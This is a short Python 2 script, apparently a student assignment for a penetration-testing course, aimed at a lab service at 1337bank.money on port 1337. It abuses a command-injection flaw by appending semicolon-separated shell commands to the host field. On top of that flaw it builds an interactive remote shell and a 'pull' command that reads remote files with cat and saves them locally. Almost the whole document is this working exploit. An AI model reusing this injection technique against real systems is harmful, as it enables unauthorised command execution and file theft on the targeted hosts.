# Tuan Le
# CMSC 389R (0201)
# 4_Pentesting_I

import socket
import sys

# IP address
host = "1337bank.money"

# Port
port = 1337

# <cd directory>
cd_dir = ""

# Sockets: https://docs.python.org/2/library/socket.html

def execute_shell(cmd):

    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
        
    # Read from socket
    data = s.recv(1024)   # Receives 1024 bytes from IP/Port

    # Send commands to socket
    s.send(host + ";" + cd_dir + cmd + ";\n")

    data2 = s.recv(4096)
    data3 = s.recv(4096)
    print(data3)

def execute_pull(cmd):

    remote_path = cmd.split(" ")[1]
    local_path = cmd.split(" ")[2]

    # Establish socket connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
        
    # Reading from socket
    data = s.recv(1024)   # Receives 1024 bytes from IP/Port

    # Send path 
    s.send(host + ";" + "cat " + remote_path + ";\n")

    data2 = s.recv(4096)
    cat_file  = s.recv(4096)
    open_file = open(local_path, "w+")
    print(cat_file)
    open_file.write(cat_file)
    open_file.close()
        
if __name__ == '__main__':

    cmd = raw_input("")

    if cmd == "quit":
        sys.exit(0)

    elif cmd == "shell":
        while True:
            cmd2 = raw_input("")
            if cmd2.split(" ")[0] == "cd" and len(cmd2.split(" ")) > 1:
                cd_dir = cmd2 + ";"
                execute_shell(cmd2)
            elif cmd2 == "cd":
                cd_dir = ""
                execute_shell(cmd2)
            else:
                execute_shell(cmd2)

    elif cmd.startswith("pull"):
        execute_pull(cmd)

    elif cmd == "help":
        print("The following are valid commands:")
        print("1. shell -> Drop into an interactive shell and allow users to gracefully exit")
        print("2. pull <remote-path> <local-path> -> Download files")
        print("3. help -> Shows this help menu")
        print("4. quit -> Quit the shell")

